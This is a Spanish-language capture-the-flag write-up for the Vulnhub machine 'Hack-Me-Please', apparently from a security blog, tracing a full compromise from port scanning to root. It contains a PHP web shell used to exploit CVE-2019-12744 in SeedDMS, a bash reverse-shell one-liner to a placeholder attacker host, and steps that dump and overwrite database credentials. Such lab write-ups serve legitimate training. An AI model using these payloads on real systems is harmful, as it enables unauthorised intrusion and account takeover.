---
title: Vulnhub - Hack-Me-Please
author: cotes
date: 2023-10-11 17:51:00 +0800
categories: [Writeup, Vulnhub, Easy]
tags: [Linux, 'Information Leakage', 'RCE (CVE-2019–12744)']
math: true
mermaid: true
image:
  path: /assets/images/Vulnhub/Easy/Hack-Me-Please/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Hack-Me-Please Machine Logo
---

Máquina Linux de nivel **Easy** de Vulnhub.

Técnicas usadas: **Information Leakage, RCE (CVE-2019–12744)**

### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos.

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/Vulnhub/Easy/Hack-Me-Please/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos

* **`nmap -p22,80 -sCV <IP> -oN versiones`**

    ![](/assets/images/Vulnhub/Easy/Hack-Me-Please/02-versions.png)

c. La fuga de información se encuentra en el fichero `/js/main.js`

```js
//make sure this js file is same as installed app on our server endpoint: /seeddms51x/seeddms-5.1.22/
```

* Ahora, realizaremos un fuzzing de directorios en `http://<IP Hack-Me-Please/seeddms51x/FUZZ`

    ```bash
    ❯ dirsearch -u http://192.168.100.40/seeddms51x/
    <SNIP>
    [09:13:15] 301 -  326B  - /seeddms51x/conf  ->  http://192.168.100.40/seeddms51x/conf/  
    ```

* Realizaremos fuzzing en el directorio **conf** 
  
    ```bash
    ❯ dirsearch -u http://192.168.100.40/seeddms51x/conf/
    <SNIP>
    [09:14:03] 200 -   12KB - /seeddms51x/conf/settings.xml 
    ```

* En el directorio **setttings.xml** tenemos credenciales de acceso a la base de datos

    ```xml
    <database dbDriver="mysql" dbHostname="localhost" dbDatabase="seeddms" dbUser="seeddms" dbPass="seeddms" doNotCheckVersion="false"> </database>
    ```

d. Una vez nos autentiquemos en la base de datos, veremos los usuarios disponible en el sistema. Adicional, encontramos credenciales del usuario 'saket'

```bash
❯ mysql -h 192.168.100.40 -u seeddms -p

MySQL [(none)]> use seeddms;

MySQL [seeddms]> select id,login,pwd,fullName from tblUsers;
+----+-------+----------------------------------+---------------+
| id | login | pwd                              | fullName      |
+----+-------+----------------------------------+---------------+
|  1 | admin | 4d186321c1a7f0f354b297e8914ab240 | Administrator |
|  2 | guest | NULL                             | Guest User    |
+----+-------+----------------------------------+---------------+
2 rows in set (0.001 sec)


MySQL [seeddms]> select * from users;
+-------------+---------------------+--------------------+-----------------+
| Employee_id | Employee_first_name | Employee_last_name | Employee_passwd |
+-------------+---------------------+--------------------+-----------------+
|           1 | saket               | saurav             | Saket@#$1337    |
+-------------+---------------------+--------------------+-----------------+
1 row in set (0.001 sec)
```

* Ahora, cambiaremos la contraseña del usuario 'admin'. Para eso debemos reemplazarla por una **hash MD5**

    ```bash
    ❯ echo -n 'testpassword' | md5sum
    e16b2ab8d12314bf4efbd6203906ea6c
    ------------------------------------------------
    MySQL [seeddms]> UPDATE tblUsers SET pwd="e16b2ab8d12314bf4efbd6203906ea6c" WHERE id=1;
    ```

e. Ahora, ya podemos acceder a **SeedDMS**. Para ejecutar comando subiremos un fichero **.php** | [**CVE-2019–12744**](https://bryanleong98.medium.com/cve-2019-12744-remote-command-execution-through-unvalidated-file-upload-in-seeddms-versions-5-1-1-5c32d90fda28)

* backup.php

    ```php
    <?php system($_GET["cmd"]); ?>
    ```

    ![](/assets/images/Vulnhub/Easy/Hack-Me-Please/03-file.png)


* Para acceder al fichero, iremos a la ruta `/seeddms51x/data/1048576/"document_id"/"version".php`

    ![](/assets/images/Vulnhub/Easy/Hack-Me-Please/04-ver.png)\

* Nos entablaremos un reverse shell: `http://<IP Hack-Me-Please/seeddms51x/data/1048576/6/2.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/[IP Host]/[Port]%200%3E%261%22`

    ```bash
    www-data@ubuntu:/var/www/html/seeddms51x/data/1048576/6$
    ```

### Escalada de Privilegios 💹

a. Le damos un tratamiento a la bash para obtener una shell totalmente interactiva `STTY`

```bash
<seeddms51x/data/1048576/6$ script /dev/null -c bash     
Script started, file is /dev/null
www-data@ubuntu:/var/www/html/seeddms51x/data/1048576/6$ ^Z
zsh: suspended  nc -lvnp 443
❯ stty raw -echo;fg
[1]  + continued  nc -lvnp 443
                              reset xterm
    [ENTER]
www-data@ubuntu:/var/www/html/seeddms51x/data/1048576/6$ export TERM=xterm-256color
www-data@ubuntu:/var/www/html/seeddms51x/data/1048576/6$ source /etc/skel/.bashrc
```

b. El usuario **saket** existe y como obtuvimos su contraseña anteriormente nos convertimos en él. Después, enumeramos nuestros privilegios a nivel de sudoers

```bash
www-data@ubuntu:/var/www/html/seeddms51x/data/1048576/6$ su saket
Password: Saket@#$1337

saket@ubuntu:/var/www/html/seeddms51x/data/1048576/6$ sudo -l

User saket may run the following commands on ubuntu:
    (ALL : ALL) ALL
```

* Podemos ejecutar cualquier comando como cualquier usuario, por lo que nos convertimos en root

    ```bash
    saket@ubuntu:/var/www/html/seeddms51x/data/1048576/6$ sudo su
    root@ubuntu:/var/www/html/seeddms51x/data/1048576/6#
    ```